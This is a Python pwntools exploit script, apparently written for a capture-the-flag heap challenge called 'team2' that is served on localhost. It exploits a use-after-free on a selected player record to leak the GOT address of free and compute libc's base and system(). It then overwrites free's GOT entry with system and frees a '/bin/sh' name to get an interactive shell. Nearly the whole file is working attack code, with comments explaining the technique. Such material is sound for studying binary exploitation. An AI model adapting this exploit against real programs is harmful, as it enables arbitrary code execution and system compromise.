from pwn import *

# r = process("./team2")
r = remote("localhost", 9997)
r.recvuntil("choice:")
elf = ELF("./team2")

def add_player(name="a"):
    r.sendline("1")
    r.sendlineafter("name:", name)
    r.sendline("2")
    r.sendline("2")
    r.sendline("2")
    r.sendline("2")

def delete_player(idx=0):
    r.sendline("2")
    r.sendline(str(idx))

def select_player(idx=0):
    r.sendline("3")
    r.sendline(str(idx))

def show_player():
    r.sendline("5")

def show_team():
    r.sendline("6")

def show_team():
    r.sendline("4")

free_addr = elf.got['free']


largename = 'a'*0x80
shortname = 'b'*0x10

# fill tcache, players from 0 to 6
# for i in range(8):
    # add_player(largename)
# for i in range(8):
    # delete_player(i)

# now we have only one block in the true bins
# which is the last pstruct created (0x18 big)






add_player()          # pstruct 0
add_player()          # pstruct 1
add_player(largename) # pstruct 2

# we now have a "selected" pointer 
# pointing to the second chunk of 
# tcache of size 0x20
select_player(1)
delete_player(1)
delete_player(2)

# this will (hopefully) use the "selected"
# freed heap chunk as our name
add_player(fit({16: p64(free_addr)}))


show_player()

r.recvuntil("Name: ")
free_libc_addr = u64(r.recvline()[:-1].ljust(8, b'\x00'))
print("free adddr: ", hex(free_libc_addr))

libc = ELF("/usr/lib/libc.so.6")
libc.address = free_libc_addr - libc.symbols["free"]

system_addr = libc.symbols["system"]

print("libc adddr: ", hex(libc.address))
print("system adddr: ", hex(system_addr))

# now we want to "edit" the fake player
# pointed to by select, and we will craft
# a pointer which we will then use by 
# set_name() to overwrite something in .got
# or .plt
# edit_player()
r.sendlineafter("choice:", "4")
r.sendlineafter("choice:", "1")

r.sendlineafter("name:", p64(system_addr).ljust(16, b'\x00'))

# go back
r.sendlineafter("choice:", "0")

print("pausing")
pause()

add_player(name="/bin/sh")
delete_player(2)

r.interactive()

